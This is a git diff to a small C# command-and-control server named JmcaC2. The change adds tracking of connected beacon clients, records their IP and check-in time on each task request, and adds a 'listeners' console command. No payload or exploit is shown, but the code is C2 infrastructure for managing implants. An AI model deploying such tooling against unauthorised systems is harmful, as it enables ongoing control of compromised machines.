@@ -9,6 +9,8 @@ namespace JmcaC2
         static bool serverRunning = true;
         static int port = 27015;
 
+        static List<BeaconClient> Clients = new List<BeaconClient>();
+
         public static void Main(string[] args)
         {
             // plan for command and control server
@@ -60,6 +62,9 @@ namespace JmcaC2
                             Console.WriteLine("Server is already running");
                         }
                         break;
+                    case "listeners":
+                        ViewConnections();
+                        break;
                     case "stop":
                         serverRunning = false;
                         listener.Stop();
@@ -79,6 +84,24 @@ namespace JmcaC2
         }
 
 
+        // View currently active beacon connections
+        public static void ViewConnections()
+        {
+            if (Clients == null)
+            {
+                Console.WriteLine("No Active Connections!");
+                return;
+            }
+
+            Console.WriteLine($"{"Client IP",-15} | {"Last CheckIn",-20}");
+            foreach (BeaconClient Client in Clients)
+            {
+
+                Console.WriteLine(Client);
+
+                // TODO: MAKE RED if configured last-checkin time > sleep time 
+            }
+        }
         // Handle incoming HTTP connections
         // GET requests are for beacon tasks
         // POST requests are for task results
@@ -103,6 +126,9 @@ namespace JmcaC2
                         var output = response.OutputStream;
                         output.Write(buffer, 0, buffer.Length);
                         output.Close();
+
+                        Clients.Add(new BeaconClient(request.RemoteEndPoint.Address, DateTime.Now));
+
                     }
                     else if (request.HttpMethod == "POST")
                     {
